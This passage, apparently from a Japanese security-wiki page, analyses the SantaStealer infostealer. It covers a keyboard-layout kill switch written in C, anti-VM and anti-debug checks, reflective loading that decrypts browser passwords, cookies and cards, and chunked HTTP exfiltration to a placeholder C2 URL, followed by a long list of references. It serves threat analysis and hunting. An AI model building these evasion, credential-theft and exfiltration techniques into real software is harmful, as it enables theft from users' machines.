SantaStealer（別名BluelineStealer）は、最新のinfo-stealerがAV bypass、anti-analysis、認証情報へのアクセスを単一のワークフローに組み合わせる手法を示しています。<sup>[[24]](#references)</sup>

### キーボードレイアウトによる実行制御とサンドボックス遅延

- 設定フラグ（`anti_cis`）は、`GetKeyboardLayoutList`を使ってインストール済みのキーボードレイアウトを列挙します。Cyrillicレイアウトが見つかると、サンプルは空の`CIS`マーカーを作成して終了し、除外対象の地域ではstealerを実行しないようにします。同時に、ハンティングに使える痕跡を残します。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 多層 `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前をカスタムのローリングチェックサムでハッシュ化して、デバッガー／sandbox の埋め込みブロックリストと照合します。コンピューター名にも同じチェックサムを適用し、`C:\analysis` などの作業ディレクトリも確認します。
- Variant B はシステムのプロパティ（プロセス数の下限、直近の稼働時間）を調べ、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、sleep の前後でタイミングを確認して single-stepping を検知します。いずれかに該当すると、モジュールの起動前に処理を中止します。

### Fileless helper と二重 ChaCha20 による reflective loading

- メインの DLL/EXE には Chromium の credential helper が埋め込まれており、ディスクにドロップするか、メモリ上に手動でマッピングします。fileless モードでは import/relocation を独自に解決するため、helper の痕跡はファイルとして書き込まれません。
- この helper は、ChaCha20 で二重に暗号化された第2段階の DLL を保持します（32 バイトの鍵2つ + 12 バイトの nonce）。両方の復号処理後、blob を reflective loading し（`LoadLibrary` は使用せず）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export を呼び出します。<sup>[[25]](#references)</sup>
- ChromElevator のルーチンは direct-syscall による reflective process hollowing を使い、稼働中の Chromium ブラウザーに inject します。AppBound Encryption の鍵を継承し、ABE の強化を回避して SQLite database からパスワード／cookie／クレジットカード情報を直接復号します。


### モジュール式のインメモリ収集と分割 HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインターテーブルを反復処理し、有効なモジュール（Telegram、Discord、Steam、スクリーンショット、ドキュメント、ブラウザー拡張機能など）ごとにスレッドを1つ起動します。各スレッドは共有バッファーに結果を書き込み、約45秒の join 後にファイル数を報告します。
- 完了後、静的リンクされた `miniz` ライブラリを使い、すべてのデータを `%TEMP%\\Log.zip` に zip 圧縮します。続いて `ThreadPayload1` は15秒間 sleep し、アーカイブを10 MBずつ HTTP POST で `http://<C2>:6767/upload` に送信します。ブラウザーの `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装します。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が追加され、最後の chunk には `complete: true` が付加されて、C2 に再構成の完了を知らせます。

## References

- [1] [高度な回避手法：精密な Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer の新たな感染チェーンと ConfuserEx ベースの難読化](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – ゼロトラストを信頼すべきか？Zscaler posture checks の回避](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去のランサムウェア活動を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：Forwarded Exports の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) の保護を活用した EDR 対策](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique による Windows Defender の保護シェルの突破](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – 純粋なカーテンの向こう側：RAT から Builder、そして Coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer がやって来る：新たな野心的 Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API Tracing による Node.js malware の解明](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet Etw の隠蔽](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operations での Chrome Remote Desktop の悪用：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の Remediation Driver を Kernel Operation Primitive として weaponize する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：LLVM を使った自己マスキング関数の作成](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - リダイレクトされた入力と出力を使った子プロセスの作成](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
